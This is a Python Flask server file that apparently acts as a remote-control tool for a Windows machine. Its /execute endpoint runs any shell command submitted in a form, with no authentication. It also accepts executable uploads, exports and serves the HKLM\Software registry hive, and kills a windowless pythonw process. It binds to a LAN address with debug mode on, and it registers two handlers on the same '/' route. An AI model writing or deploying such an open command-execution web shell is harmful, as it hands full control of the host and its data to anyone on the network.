from flask import Flask, render_template, request, send_file
import subprocess
import os

app = Flask(__name__)

UPLOAD_FOLDER = 'uploads'
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif', 'exe'}

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route('/')
def index():
    return render_template('index.html')
    
@app.route('/')
def indexi():
    return render_template('help.html')

@app.route('/execute', methods=['POST'])
def execute():
    command = request.form['command']
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        return result
    except subprocess.CalledProcessError as e:
        return str(e.output)

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return "No file part"
    
    file = request.files['file']

    if file.filename == '':
        return "No selected file"

    if file and allowed_file(file.filename):
        filename = os.path.join(app.config['UPLOAD_FOLDER'], file.filename)
        file.save(filename)
        return f'File uploaded successfully to {filename}'

    return "File type not allowed"

@app.route('/shutdown', methods=['POST'])
def shutdown():
    try:
        result = subprocess.check_output('taskkill /f /im pythonw3.11.exe', shell=True, stderr=subprocess.STDOUT, text=True)
        return result
    except subprocess.CalledProcessError as e:
        return str(e.output)

@app.route('/download_registry', methods=['POST'])
def download_registry_post():
    try:
        result = subprocess.check_output('reg export HKLM\\Software registry_backup.reg', shell=True, stderr=subprocess.STDOUT, text=True)
        return result
    except subprocess.CalledProcessError as e:
        return str(e.output)

@app.route('/download_registry', methods=['GET'])
def download_registry_get():
    try:
        return send_file('registry_backup.reg', as_attachment=True)
    except FileNotFoundError:
        return "Registry backup file not found."

if __name__ == '__main__':
    import sys

    if len(sys.argv) > 1:
        ip = sys.argv[1]
    else:
        ip = '192.168.0.59'

    if len(sys.argv) > 2:
        port = int(sys.argv[2])
    else:
        port = 5000

    app.run(debug=True, host=ip, port=port)
